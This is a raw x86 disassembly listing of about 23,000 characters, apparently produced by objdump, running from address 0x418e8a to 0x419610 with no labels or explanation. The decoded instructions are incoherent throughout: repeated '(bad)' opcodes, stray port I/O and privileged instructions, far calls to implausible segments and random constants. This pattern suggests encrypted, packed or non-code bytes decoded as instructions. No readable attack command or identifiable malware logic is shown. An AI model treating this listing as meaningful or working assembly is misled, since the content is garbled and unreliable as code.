  418e8a:	lods   eax,DWORD PTR ds:[esi]
  418e8b:	mov    edx,0x9d33f9aa
  418e90:	stos   BYTE PTR es:[edi],al
  418e91:	sbb    al,0x4c
  418e93:	cmp    DWORD PTR [ebx],ebp
  418e95:	(bad)  
  418e96:	xor    eax,0x1492e9a4
  418e9b:	(bad)  
  418e9c:	sub    eax,0x9635e19b
  418ea1:	jbe    0x418e66
  418ea3:	inc    esp
  418ea4:	fs es sahf 
  418ea7:	popa   
  418ea8:	cmc    
  418ea9:	pop    es
  418eaa:	leave  
  418eab:	test   DWORD PTR [ebp-0x25],ebx
  418eae:	jecxz  0x418f1e
  418eb0:	and    bl,dl
  418eb2:	add    eax,0x4ca453dd
  418eb7:	repnz int3 
  418eb9:	repnz mov ds:0x84fd93a7,al
  418ebf:	sti    
  418ec0:	test   eax,0x38951e6b
  418ec5:	leave  
  418ec6:	enter  0x9f24,0x68
  418eca:	inc    esi
  418ecb:	ss pusha 
  418ecd:	sbb    edx,esp
  418ecf:	mov    WORD PTR [edx+0x4d20fdf1],fs
  418ed5:	push   ss
  418ed6:	ja     0x418e59
  418ed8:	and    eax,0x9da679d9
  418edd:	stc    
  418ede:	repz rcr DWORD PTR ds:[edx+0x21],0x1
  418ee4:	push   esp
  418ee5:	fidivr DWORD PTR [edx+0x57]
  418ee9:	jl     0x418f2c
  418eeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418eec:	stos   BYTE PTR es:[edi],al
  418eed:	or     eax,0x733860f
  418ef2:	int    0x8b
  418ef4:	call   0x5c97:0x86d61540
  418efb:	sub    BYTE PTR [ebp+esi*1-0x1b2c9faf],0x9c
  418f03:	lock das 
  418f05:	icebp  
  418f06:	inc    eax
  418f07:	in     al,dx
  418f08:	mov    ebx,0xacd61bb8
  418f0d:	xchg   esp,eax
  418f0e:	xlat   BYTE PTR ds:[ebx]
  418f0f:	mov    bl,0x3b
  418f11:	jmp    0x65f3a3de
  418f16:	adc    cl,BYTE PTR [ecx]
  418f18:	jle    0x418f8a
  418f1a:	adc    al,0x6e
  418f1c:	shl    BYTE PTR [ecx+0x32],0xaa
  418f20:	stos   DWORD PTR es:[edi],eax
  418f21:	outs   dx,DWORD PTR ds:[esi]
  418f22:	xchg   ebx,eax
  418f23:	dec    eax
  418f24:	scas   eax,DWORD PTR es:[edi]
  418f25:	sub    cl,0x98
  418f28:	ins    BYTE PTR es:[edi],dx
  418f29:	push   esi
  418f2a:	xor    al,0x54
  418f2c:	mov    ch,0xef
  418f2e:	and    ch,BYTE PTR [edi+0x2c]
  418f31:	call   0xf88e3ff4
  418f36:	call   0x60ae:0x90e76ee5
  418f3d:	fwait
  418f3e:	and    dl,BYTE PTR ss:[edi-0x43a41a71]
  418f45:	mov    bh,0x11
  418f47:	cli    
  418f48:	hlt    
  418f49:	and    bl,bh
  418f4b:	push   ecx
  418f4c:	xor    esp,ecx
  418f4e:	jp     0x418f4b
  418f50:	ror    BYTE PTR [ebx],cl
  418f52:	jg     0x418ed9
  418f54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f55:	mov    cl,0x80
  418f57:	or     al,BYTE PTR [edx-0x58]
  418f5a:	stos   DWORD PTR es:[edi],eax
  418f5b:	pop    eax
  418f5c:	inc    ebp
  418f5d:	add    bl,BYTE PTR [ecx+0x3]
  418f60:	(bad)  
  418f61:	iret   
  418f62:	imul   edi,DWORD PTR [edx-0x72],0xd363c754
  418f69:	fwait
  418f6a:	call   0x5ed8:0xe11e9c71
  418f71:	xchg   esp,eax
  418f72:	out    dx,eax
  418f73:	in     eax,dx
  418f74:	mov    ch,0xa8
  418f76:	mov    eax,0xc72a1f2c
  418f7b:	push   ds
  418f7c:	std    
  418f7d:	not    BYTE PTR ds:0xc478591b
  418f83:	ret    0x5481
  418f86:	cmp    al,0x66
  418f88:	sahf   
  418f89:	pop    es
  418f8a:	and    eax,0xb4ca0eb3
  418f8f:	leave  
  418f90:	shl    ch,cl
  418f92:	add    BYTE PTR [ebx],al
  418f94:	push   ss
  418f95:	or     eax,DWORD PTR [edx]
  418f97:	or     cl,bl
  418f99:	adc    eax,0xcbaef11
  418f9e:	out    0xda,eax
  418fa0:	add    eax,0xcab121a5
  418fa5:	pop    edx
  418fa6:	out    dx,al
  418fa7:	and    eax,0x22a8721e
  418fac:	xchg   esi,eax
  418fad:	mov    edx,0x936c862f
  418fb2:	ins    DWORD PTR es:[edi],dx
  418fb3:	pop    esp
  418fb4:	and    eax,0x8de59178
  418fb9:	inc    ecx
  418fba:	ret    0xd3a9
  418fbd:	mov    cl,0xb7
  418fbf:	cmp    al,0x21
  418fc1:	cmp    DWORD PTR [edx+0x79],0x7665a0b5
  418fc8:	sbb    al,0x74
  418fca:	mov    dl,0x6
  418fcc:	xchg   edx,ebx
  418fce:	out    dx,al
  418fcf:	in     eax,dx
  418fd0:	jl     0x418f61
  418fd2:	jae    0x418fc6
  418fd4:	cmp    cl,BYTE PTR [edx-0x71]
  418fd7:	mov    BYTE PTR [eax-0x21],bl
  418fda:	sahf   
  418fdb:	sahf   
  418fdc:	mov    esi,0x51a6bb82
  418fe1:	sub    BYTE PTR ss:[edi],bl
  418fe4:	mov    ah,ch
  418fe6:	(bad)  [esi+0x4830725b]
  418fec:	stos   BYTE PTR es:[edi],al
  418fed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fee:	jge    0x41900a
  418ff0:	es mov edx,0x4c3d7dcf
  418ff6:	mov    ds:0x355b70a9,al
  418ffb:	xchg   ecx,eax
  418ffc:	mov    WORD PTR [ebx],?
  418ffe:	in     eax,0xd5
  419000:	mov    al,0x44
  419002:	push   ds
  419003:	ja     0x419031
  419005:	dec    ebx
  419006:	jge    0x419033
  419008:	pop    esi
  419009:	cmc    
  41900a:	iret   
  41900b:	sub    al,BYTE PTR ds:0x9c6832ea
  419011:	jne    0x418f9a
  419013:	retf   
  419014:	xor    bl,dh
  419016:	ins    BYTE PTR es:[edi],dx
  419017:	inc    eax
  419018:	aam    0x73
  41901a:	mov    ebx,0xda897207
  41901f:	retf   0xc543
  419022:	xchg   DWORD PTR [esi+0x20],ecx
  419025:	popf   
  419026:	xchg   ebp,eax
  419027:	sbb    cl,BYTE PTR [edi-0x80]
  41902a:	sbb    DWORD PTR [eax+0xd],edi
  41902d:	push   ss
  41902e:	cdq    
  41902f:	mov    ecx,0xe70069e
  419034:	pushf  
  419035:	stos   DWORD PTR es:[edi],eax
  419036:	fwait
  419037:	scas   eax,DWORD PTR es:[edi]
  419038:	xchg   DWORD PTR [ecx+0x60721c4e],ecx
  41903e:	mov    bh,0xb8
  419040:	sti    
  419041:	scas   eax,DWORD PTR es:[edi]
  419042:	retf   0x93b5
  419045:	repnz fstp DWORD PTR [edx-0x46]
  419049:	and    eax,0x591a5f4a
  41904e:	jl     0x419024
  419050:	or     bl,BYTE PTR [ebx-0x1]
  419053:	dec    edi
  419054:	adc    al,0x5f
  419056:	stos   BYTE PTR es:[edi],al
  419057:	sub    DWORD PTR [ebp+0x37fbea32],ebx
  41905d:	das    
  41905e:	push   ebp
  41905f:	jecxz  0x419065
  419061:	xchg   esi,eax
  419062:	imul   edx,eax,0xedc9251d
  419068:	mov    ecx,ss
  41906a:	adc    DWORD PTR [eax-0x6745a9e9],ebx
  419070:	aad    0xc0
  419072:	mov    ecx,0x97bfb93c
  419077:	mov    al,0xc0
  419079:	cmp    esi,ebp
  41907b:	xchg   edx,eax
  41907c:	pop    esi
  41907d:	in     eax,dx
  41907e:	jge    0x4190f5
  419080:	stc    
  419081:	push   es
  419082:	cs aam 0xd5
  419085:	cmp    al,BYTE PTR [esi]
  419087:	jmp    0x419106
  419089:	sbb    DWORD PTR [edx+ebp*4-0x27a8f7f6],0xe06659a6
  419094:	mov    esp,0x8158d28f
  419099:	cli    
  41909a:	sbb    bh,BYTE PTR [ebx-0x3fa79d7c]
  4190a0:	pusha  
  4190a1:	in     eax,0xe3
  4190a3:	ins    BYTE PTR es:[edi],dx
  4190a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190a5:	mov    edi,0x7f12c4e2
  4190aa:	sub    eax,0xcd7b78e
  4190af:	sub    edi,DWORD PTR [edx]
  4190b1:	mov    edi,0x1324e5a1
  4190b6:	pop    ebx
  4190b7:	mov    ds:0x28ca0084,eax
  4190bc:	jle    0x41907b
  4190be:	xchg   ecx,eax
  4190bf:	dec    edx
  4190c0:	mov    eax,0x68f70d7
  4190c5:	xchg   edi,eax
  4190c6:	mov    eax,ds:0x5450d823
  4190cb:	call   0x8a86ea3d
  4190d0:	outs   dx,BYTE PTR ds:[esi]
  4190d1:	enter  0xc8d9,0xe8
  4190d5:	sub    al,0x3
  4190d7:	imul   ebx,DWORD PTR [edi-0x2573fe4f],0xfa338aa0
  4190e1:	jb     0x4190cb
  4190e3:	dec    ebp
  4190e4:	pusha  
  4190e5:	es jbe 0x4190f2
  4190e8:	cmp    al,0x5b
  4190ea:	das    
  4190eb:	call   0x6170ceb6
  4190f0:	enter  0xc7cf,0x12
  4190f4:	and    bl,BYTE PTR [eax]
  4190f6:	xchg   esp,eax
  4190f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190f8:	sbb    DWORD PTR [ebp+ecx*4+0x2128e3b4],edx
  4190ff:	addr16 in al,0x92
  419102:	dec    esi
  419103:	adc    ebx,DWORD PTR [edx-0x5]
  419106:	push   esp
  419107:	fwait
  419108:	pusha  
  419109:	mov    dh,0xc9
  41910b:	loop   0x419162
  41910d:	cmp    edx,DWORD PTR [edi+0x7c]
  419110:	rol    DWORD PTR [eax-0x73],cl
  419113:	mov    DWORD PTR [edi+0x434b7bf7],ebp
  419119:	push   ds
  41911a:	xchg   esi,eax
  41911b:	mov    ds:0x7c9fffc,eax
  419120:	cmc    
  419121:	(bad)  
  419122:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419123:	aam    0xc3
  419125:	test   al,0xb5
  419127:	outs   dx,BYTE PTR ds:[esi]
  419128:	lods   eax,DWORD PTR ds:[esi]
  419129:	add    ah,BYTE PTR [ebx+0x6d]
  41912c:	jle    0x4190e3
  41912e:	pop    esi
  41912f:	sbb    BYTE PTR [esi-0x2cae66d8],cl
  419135:	hlt    
  419136:	xor    al,0xa5
  419138:	or     eax,0x401a2eff
  41913d:	bound  ebp,QWORD PTR [esp+eiz*4]
  419140:	inc    esp
  419141:	and    eax,0x7220032a
  419146:	xchg   edi,eax
  419147:	js     0x419197
  419149:	mov    ds:0x9fed6ced,eax
  41914e:	or     BYTE PTR [ecx+0x74],cl
  419151:	(bad)  
  419152:	nop
  419153:	(bad)  
  419154:	rol    BYTE PTR [ecx+0x0],cl
  419157:	mov    esp,0xe34a1b20
  41915c:	mov    eax,0x34161b73
  419161:	ror    DWORD PTR [ebp+0x5c357f07],cl
  419167:	dec    ebp
  419168:	mov    bl,0x6a
  41916a:	xchg   ecx,ebx
  41916c:	sbb    dl,ch
  41916e:	xchg   esi,eax
  41916f:	xchg   ebx,eax
  419170:	jge    0x41910c
  419172:	or     BYTE PTR [edx-0x7e],dl
  419175:	pop    ds
  419176:	lock je 0x419147
  419179:	sub    al,0xa1
  41917b:	jl     0x419179
  41917d:	xor    esi,esp
  41917f:	xchg   esi,eax
  419180:	popa   
  419181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419182:	mov    ds,WORD PTR [ebp-0x2ad2de0b]
  419188:	shl    BYTE PTR [edx],0x28
  41918b:	mov    bl,0x2c
  41918d:	sbb    ecx,DWORD PTR [edi+0x18]
  419190:	into   
  419191:	push   esi
  419192:	out    dx,eax
  419193:	push   edi
  419194:	neg    DWORD PTR [esp+edi*2-0x44]
  419198:	fcom   DWORD PTR [edi+0x2f]
  41919b:	inc    ecx
  41919c:	add    DWORD PTR [ebx+0x3a56e96c],ecx
  4191a2:	inc    esi
  4191a3:	xor    ah,BYTE PTR [esi]
  4191a5:	pop    edx
  4191a6:	jo     0x419146
  4191a8:	add    BYTE PTR [edi],cl
  4191aa:	addr16 jmp 0x419154
  4191ad:	test   BYTE PTR [ebp-0x3068b0fa],cl
  4191b3:	sbb    BYTE PTR [edx-0x2f1ab804],bl
  4191b9:	cmp    DWORD PTR ds:0xc0e658ff,eax
  4191bf:	adc    BYTE PTR [ecx+0x1c],bl
  4191c2:	lea    ebx,[esi-0x17]
  4191c5:	xchg   ebp,eax
  4191c6:	aad    0xa6
  4191c8:	repz icebp 
  4191ca:	adc    edx,ecx
  4191cc:	addr16 mov ebp,0x3bcb1c1f
  4191d2:	ror    DWORD PTR [ebp-0x7],0xca
  4191d6:	not    DWORD PTR [esi]
  4191d8:	xor    DWORD PTR [ebx+0x2949dd50],edi
  4191de:	repnz ror esi,cl
  4191e1:	pop    ss
  4191e2:	jmp    0x52de:0x82ffe25f
  4191e9:	push   esi
  4191ea:	cdq    
  4191eb:	mov    ch,0xbc
  4191ed:	scas   al,BYTE PTR es:[edi]
  4191ee:	pop    ds
  4191ef:	add    BYTE PTR [ecx],dl
  4191f1:	cmc    
  4191f2:	sbb    BYTE PTR [ebp+ecx*4+0x5b],al
  4191f6:	retf   
  4191f7:	and    ch,BYTE PTR [ecx-0x2c]
  4191fa:	popf   
  4191fb:	pop    edx
  4191fc:	lods   eax,DWORD PTR ds:[esi]
  4191fd:	xchg   ebp,eax
  4191fe:	mov    DWORD PTR [edx+0x24],esi
  419201:	rcr    ebx,cl
  419203:	addr16 dec ebx
  419205:	add    esp,DWORD PTR [edi+0xf]
  419208:	xor    esp,DWORD PTR es:[edi]
  41920b:	cmp    cl,BYTE PTR [ebx+0x29557754]
  419211:	dec    esp
  419212:	cmp    eax,0x2df6f1f7
  419217:	jle    0x41925d
  419219:	(bad)  
  41921b:	and    al,0x1d
  41921d:	or     BYTE PTR [edi-0x7ca59175],0xf5
  419224:	pop    eax
  419225:	sub    eax,0x87745a59
  41922a:	mov    ebp,0xc962caf8
  41922f:	cmp    edx,DWORD PTR [edx]
  419231:	or     eax,0xed797d96
  419236:	add    BYTE PTR ds:0x954479eb,0xc7
  41923d:	mov    esi,?
  41923f:	pop    ebx
  419240:	lds    ebp,FWORD PTR fs:[edi]
  419243:	loopne 0x4191eb
  419245:	jle    0x41927a
  419247:	mov    dl,0xed
  419249:	repz fild DWORD PTR [eax]
  41924c:	xchg   esi,eax
  41924d:	out    0x7e,eax
  41924f:	jne    0x4191e8
  419251:	jnp    0x419270
  419253:	fwait
  419254:	push   edi
  419255:	iret   
  419256:	lahf   
  419257:	mov    cl,0xd1
  419259:	jnp    0x41922a
  41925b:	push   esi
  41925c:	push   cs
  41925d:	sub    ecx,DWORD PTR [edi+0x3d60af5c]
  419263:	push   ds
  419264:	aas    
  419265:	jecxz  0x4192bf
  419267:	pop    esp
  419268:	lahf   
  419269:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41926a:	(bad)  [eax]
  41926c:	js     0x419200
  41926e:	inc    edx
  41926f:	lods   eax,DWORD PTR ds:[esi]
  419270:	(bad)  
  419271:	hlt    
  419272:	gs xor al,0x4d
  419275:	pop    ds
  419276:	and    ch,dh
  419278:	push   0xffffffe1
  41927a:	sub    al,0x9b
  41927c:	xchg   esp,eax
  41927d:	popf   
  41927e:	loope  0x4192bf
  419280:	xchg   bl,cl
  419282:	add    BYTE PTR [ebx-0x2a],ah
  419285:	dec    edx
  419286:	pop    esi
  419287:	mov    dl,BYTE PTR [edx+esi*4]
  41928a:	jbe    0x4192f9
  41928c:	and    DWORD PTR [ebp-0x2f],ebx
  41928f:	das    
  419290:	add    BYTE PTR ds:0xdd05b448,ah
  419296:	dec    eax
  419297:	(bad)  
  419298:	hlt    
  419299:	cld    
  41929a:	sbb    eax,0x96f79815
  41929f:	mov    bh,0x85
  4192a1:	xchg   BYTE PTR [edx+0x48b1f53f],dl
  4192a7:	add    eax,0x1c5838e
  4192ac:	jo     0x4192cc
  4192ae:	(bad)  
  4192af:	xchg   edx,eax
  4192b0:	mov    eax,0x61b6a93d
  4192b5:	cs inc eax
  4192b7:	xor    ch,bh
  4192b9:	push   ecx
  4192ba:	lods   eax,DWORD PTR ds:[esi]
  4192bb:	or     BYTE PTR [ebx-0xce237d2],0x82
  4192c2:	dec    edi
  4192c3:	arpl   sp,sp
  4192c5:	jecxz  0x4192da
  4192c7:	add    DWORD PTR [ecx-0x58807032],eax
  4192cd:	push   ebp
  4192ce:	(bad)  
  4192cf:	loope  0x4192b2
  4192d1:	push   edi
  4192d2:	dec    esi
  4192d3:	lods   al,BYTE PTR ds:[esi]
  4192d4:	sbb    ecx,0xe3257b08
  4192da:	mov    edx,0xe163b0a3
  4192df:	jbe    0x41928c
  4192e1:	adc    ch,dl
  4192e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192e4:	dec    esp
  4192e5:	stc    
  4192e6:	out    0xaa,al
  4192e8:	push   0x5d1ed845
  4192ed:	push   ebp
  4192ee:	iret   
  4192ef:	sub    eax,0xc605c442
  4192f4:	pop    ebx
  4192f5:	in     eax,0xab
  4192f7:	inc    ebx
  4192f8:	jnp    0x419328
  4192fa:	xchg   ebx,eax
  4192fb:	into   
  4192fc:	mov    ds:0xfbf620e8,eax
  419301:	adc    dh,BYTE PTR [edi]
  419303:	test   al,0xc6
  419305:	cmp    BYTE PTR [edx-0x7f],al
  419308:	sub    eax,0x734b6647
  41930d:	push   ecx
  41930e:	add    edi,DWORD PTR [ebx+0x1243c4f4]
  419314:	dec    eax
  419315:	dec    esp
  419316:	ins    BYTE PTR es:[edi],dx
  419317:	sbb    edx,eax
  419319:	cmc    
  41931a:	dec    eax
  41931b:	pop    edx
  41931c:	sar    BYTE PTR ds:0x5d2a9515,cl
  419322:	pop    esi
  419323:	pop    ss
  419324:	ret    0x6e15
  419327:	rcr    DWORD PTR [ecx+0x12cf5ad8],cl
  41932d:	into   
  41932e:	test   al,0x14
  419330:	es pushf 
  419332:	mov    gs,edi
  419334:	push   es
  419335:	push   ss
  419336:	and    esi,DWORD PTR [eiz*4+0x6e31721a]
  41933d:	(bad)  
  41933e:	push   0xe212b173
  419343:	(bad)  
  419344:	or     al,0x6c
  419346:	dec    ecx
  419347:	and    ecx,DWORD PTR [ebp+0x64]
  41934a:	pop    ss
  41934b:	mov    eax,0x39872954
  419350:	add    BYTE PTR [ecx],al
  419352:	push   ecx
  419353:	cdq    
  419354:	mov    ds:0x9c9d2ba9,al
  419359:	sbb    dl,BYTE PTR [esi+ecx*1]
  41935c:	add    DWORD PTR [esi+0x344f90ec],0xae360f2
  419366:	add    BYTE PTR [ecx+eiz*1+0x42],al
  41936a:	stos   DWORD PTR es:[edi],eax
  41936b:	pop    edx
  41936c:	cmp    DWORD PTR [esi+0x7f],0x2ebc7870
  419373:	sbb    al,0x72
  419375:	pop    ebx
  419376:	and    ecx,DWORD PTR [ebp-0x69]
  419379:	repnz dec eax
  41937b:	dec    ebp
  41937c:	lods   eax,DWORD PTR ds:[esi]
  41937d:	out    0x56,al
  41937f:	cs pop edx
  419381:	jecxz  0x41939a
  419383:	xor    DWORD PTR cs:[eax+0x21d4db18],edx
  41938a:	ins    BYTE PTR es:[edi],dx
  41938b:	jmp    0x1c390839
  419390:	mov    al,ds:0x892e0517
  419395:	hlt    
  419396:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419397:	stos   DWORD PTR es:[edi],eax
  419398:	aas    
  419399:	(bad)  
  41939a:	js     0x419405
  41939c:	mov    esi,0x5648558a
  4193a1:	clc    
  4193a2:	in     eax,0xbc
  4193a4:	dec    ecx
  4193a5:	jns    0x41939c
  4193a7:	mov    al,ds:0xcc679801
  4193ac:	or     BYTE PTR [ecx-0x4ede141d],bh
  4193b2:	sbb    al,0xdd
  4193b4:	mov    ebp,DWORD PTR [ecx]
  4193b6:	test   al,0x78
  4193b8:	into   
  4193b9:	jae    0x41934b
  4193bb:	inc    edi
  4193bc:	jns    0x41936e
  4193be:	sub    DWORD PTR [esi],esp
  4193c0:	int    0xc5
  4193c2:	in     eax,dx
  4193c3:	ins    DWORD PTR es:[edi],dx
  4193c4:	fcomp  QWORD PTR [eax]
  4193c6:	dec    ecx
  4193c7:	iret   
  4193c8:	scas   al,BYTE PTR es:[edi]
  4193c9:	out    0xaa,al
  4193cb:	add    eax,0x6b40e822
  4193d0:	ficom  WORD PTR [ebp-0x5e22f250]
  4193d6:	pop    edx
  4193d7:	xor    al,0x10
  4193d9:	pop    edx
  4193da:	pop    eax
  4193db:	mov    dh,0x68
  4193dd:	mov    esp,0x33cf125
  4193e2:	sub    eax,0x753f3f04
  4193e7:	out    0xf3,al
  4193e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193ea:	pop    ss
  4193eb:	stos   DWORD PTR es:[edi],eax
  4193ec:	test   eax,ebx
  4193ee:	dec    esp
  4193ef:	hlt    
  4193f0:	pop    esp
  4193f1:	daa    
  4193f2:	jl     0x41942b
  4193f4:	out    0xf1,al
  4193f6:	(bad)  
  4193f8:	arpl   WORD PTR [ebx+0x72],dx
  4193fb:	and    esp,DWORD PTR [ebx]
  4193fd:	or     al,0xcf
  4193ff:	adc    BYTE PTR [esi],al
  419401:	sub    DWORD PTR [esi+0x7f],ebx
  419404:	pop    ebp
  419405:	push   ss
  419406:	and    al,0xad
  419408:	(bad)  
  41940a:	dec    eax
  41940b:	int    0xcf
  41940d:	ffreep st(6)
  41940f:	clc    
  419410:	aad    0xdf
  419412:	pop    ecx
  419413:	jnp    0x4193f1
  419415:	cli    
  419416:	in     eax,dx
  419417:	int    0x5a
  419419:	loope  0x419439
  41941b:	inc    esi
  41941c:	popa   
  41941d:	test   al,0xe3
  41941f:	sahf   
  419420:	inc    ebp
  419421:	or     al,0x87
  419423:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419424:	cs mov ebx,0x7e191837
  41942a:	mov    ebp,0x41d22fd9
  41942f:	push   ecx
  419430:	scas   al,BYTE PTR es:[edi]
  419431:	int    0x95
  419433:	pop    edx
  419434:	sti    
  419435:	push   ebp
  419436:	dec    edi
  419437:	(bad)  
  419438:	into   
  419439:	fnstsw WORD PTR [eax]
  41943b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41943c:	dec    esi
  41943d:	aad    0x67
  41943f:	and    al,BYTE PTR [esi]
  419441:	jg     0x4194b3
  419443:	loope  0x419428
  419445:	lods   eax,DWORD PTR ds:[esi]
  419446:	aas    
  419447:	ss out dx,al
  419449:	add    al,0xe9
  41944b:	fs fs push eax
  41944e:	in     eax,0x3e
  419450:	aas    
  419451:	add    BYTE PTR [esi],dh
  419453:	sub    DWORD PTR [eax],edi
  419455:	mov    al,0x28
  419457:	push   0x7e
  419459:	outs   dx,BYTE PTR ds:[esi]
  41945a:	out    0x10,al
  41945c:	sub    BYTE PTR [edx+0x4b],cl
  41945f:	loopne 0x4193f8
  419461:	push   eax
  419462:	ficom  WORD PTR [ecx]
  419464:	push   es
  419465:	sbb    ch,al
  419467:	mov    ds:0x9cd7a349,al
  41946c:	sbb    dl,ch
  41946e:	jl     0x4193f1
  419470:	xor    DWORD PTR [edx+0x3f],eax
  419473:	(bad)  
  419474:	jns    0x419461
  419476:	test   DWORD PTR [edx+ebx*1-0x4],eax
  41947a:	repnz push 0x1a
  41947d:	jnp    0x41941b
  41947f:	pop    esi
  419480:	xor    esi,esp
  419482:	adc    BYTE PTR [ebx-0x4c],bl
  419485:	push   ss
  419486:	add    eax,0xa1729a7c
  41948b:	pop    es
  41948c:	lock xchg BYTE PTR [edx],ch
  41948f:	jbe    0x41950d
  419491:	repz mov ebp,0x646cec27
  419497:	out    dx,eax
  419498:	cdq    
  419499:	call   0xb2d853c5
  41949e:	adc    edx,DWORD PTR [ecx]
  4194a0:	xchg   edi,eax
  4194a1:	jmp    0x7432:0x40c037ae
  4194a8:	sbb    edx,DWORD PTR ds:0xe670791
  4194ae:	cmc    
  4194af:	ret    
  4194b0:	imul   esp,DWORD PTR [esi-0x6a],0xffffffe4
  4194b4:	fmul   QWORD PTR [edi-0xb]
  4194b7:	ins    BYTE PTR es:[edi],dx
  4194b8:	sti    
  4194b9:	jmp    0x419491
  4194bb:	dec    ecx
  4194bc:	mov    ah,0xb0
  4194be:	inc    ebx
  4194bf:	adc    dl,ah
  4194c1:	es xchg esp,eax
  4194c3:	hlt    
  4194c4:	(bad)  
  4194c5:	push   ebp
  4194c6:	and    BYTE PTR ds:0x2453b85c,0xb6
  4194cd:	shr    DWORD PTR [ebx+esi*8+0x355dce2],0x68
  4194d5:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4194d7:	add    eax,edx
  4194d9:	adc    dh,BYTE PTR [ebp+0x498cd3f3]
  4194df:	ret    
  4194e0:	mov    al,ds:0xc7ef4710
  4194e5:	jmp    0x463366aa
  4194ea:	daa    
  4194eb:	sbb    esi,esp
  4194ed:	sub    edx,eax
  4194ef:	shr    BYTE PTR [ebx],cl
  4194f1:	adc    eax,DWORD PTR [ebx+0x3497efb0]
  4194f7:	or     BYTE PTR [edx-0x5e],bh
  4194fa:	inc    edx
  4194fb:	xchg   ebx,eax
  4194fc:	outs   dx,DWORD PTR ds:[esi]
  4194fd:	add    al,0x71
  4194ff:	jb     0x419549
  419501:	in     al,0x14
  419503:	cwde   
  419504:	rcl    DWORD PTR [ebp-0x3a1b6ba3],0xc5
  41950b:	outs   dx,BYTE PTR ds:[esi]
  41950c:	dec    eax
  41950d:	popf   
  41950e:	jne    0x41950f
  419510:	xchg   edx,eax
  419511:	mov    ecx,0x2933036f
  419516:	inc    eax
  419517:	pusha  
  419518:	pop    es
  419519:	iret   
  41951a:	gs (bad) 
  41951c:	cli    
  41951d:	sub    al,0xce
  41951f:	pusha  
  419520:	in     al,dx
  419521:	push   eax
  419522:	lea    ebp,[edx+0x45]
  419525:	push   cs
  419526:	and    al,0x2c
  419528:	inc    eax
  419529:	pop    esi
  41952a:	lock add bh,BYTE PTR ds:0xcb99cc09
  419531:	pop    esi
  419532:	fwait
  419533:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419534:	outs   dx,DWORD PTR ds:[esi]
  419535:	cmp    al,0x55
  419537:	mov    dl,0xbe
  419539:	and    ch,BYTE PTR [ebp+0x6e]
  41953c:	je     0x41958a
  41953e:	enter  0x65d7,0xe5
  419542:	scas   al,BYTE PTR es:[edi]
  419543:	and    BYTE PTR [edi],0xf4
  419546:	int3   
  419547:	iret   
  419548:	gs add eax,0x962b349e
  41954e:	pop    esi
  41954f:	shl    BYTE PTR [eax],0xa8
  419552:	push   0xe3e4f73a
  419557:	test   al,0xc2
  419559:	or     al,0x4d
  41955b:	icebp  
  41955c:	je     0x41955f
  41955e:	pop    ss
  41955f:	inc    edx
  419560:	repz cmp al,BYTE PTR [esi]
  419563:	inc    ebx
  419564:	daa    
  419565:	(bad)
  419569:	mov    al,0xce
  41956b:	loop   0x419503
  41956d:	dec    ebx
  41956e:	or     dh,BYTE PTR [ebx-0x4aabd695]
  419574:	mov    dh,0xf7
  419576:	push   es
  419577:	(bad)  
  419578:	jmp    0x4195b5
  41957a:	cld    
  41957b:	rol    BYTE PTR [edi+edi*1],0xbc
  41957f:	and    BYTE PTR [eax-0x57],ah
  419582:	mov    al,ds:0xb7f52ead
  419587:	jnp    0x4195ee
  419589:	jl     0x41953e
  41958b:	inc    eax
  41958c:	leave  
  41958d:	outs   dx,BYTE PTR ds:[esi]
  41958e:	cmp    eax,0x855045ef
  419593:	mul    ah
  419595:	mov    BYTE PTR [eax],bl
  419597:	js     0x4195a1
  419599:	mov    dl,0x43
  41959b:	sub    DWORD PTR [ebx+0x61],edx
  41959e:	add    eax,0x82495c36
  4195a3:	cs push edx
  4195a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195a6:	mov    al,0xf8
  4195a8:	out    dx,eax
  4195a9:	out    dx,eax
  4195aa:	icebp  
  4195ab:	pop    ds
  4195ac:	(bad)  
  4195ad:	out    dx,al
  4195ae:	mov    BYTE PTR [ebx+esi*2],bh
  4195b1:	mov    al,ds:0x2cbf858c
  4195b6:	jg     0x4195f4
  4195b8:	test   DWORD PTR [ecx],esp
  4195ba:	mov    DWORD PTR [eax+0x2e657142],ecx
  4195c0:	sub    eax,0xd839b808
  4195c5:	nop
  4195c6:	push   ecx
  4195c7:	cmp    bl,0x26
  4195ca:	xchg   ecx,eax
  4195cb:	aaa    
  4195cc:	pop    edx
  4195cd:	mov    cl,0xf
  4195cf:	or     al,0x5c
  4195d1:	pop    ecx
  4195d2:	jne    0x419562
  4195d4:	mov    gs,WORD PTR [eax+0xd]
  4195d7:	xchg   edx,eax
  4195d8:	mov    cl,0x2e
  4195da:	adc    cl,al
  4195dc:	jmp    0xa2c6f9b8
  4195e1:	adc    BYTE PTR [ebp+0x55a97479],ah
  4195e7:	xor    esi,DWORD PTR [esi]
  4195e9:	in     al,0x2e
  4195eb:	and    al,ch
  4195ed:	outs   dx,BYTE PTR ds:[esi]
  4195ee:	pushf  
  4195ef:	ins    BYTE PTR es:[edi],dx
  4195f0:	sbb    DWORD PTR [esi+0x13],edx
  4195f3:	pusha  
  4195f4:	mov    ch,0xbb
  4195f6:	mov    WORD PTR [ecx],es
  4195f8:	and    bl,BYTE PTR [edi]
  4195fa:	xor    dh,BYTE PTR [eax]
  4195fc:	dec    esp
  4195fd:	push   ss
  4195fe:	sub    dh,BYTE PTR [edx+edi*8-0xd]
  419602:	std    
  419603:	sbb    eax,eax
  419605:	inc    esp
  419606:	jge    0x419645
  419608:	mov    ah,BYTE PTR [ebx-0x910eb40]
  41960e:	dec    esp
  41960f:	inc    eax
  419610:	jb     0x419687
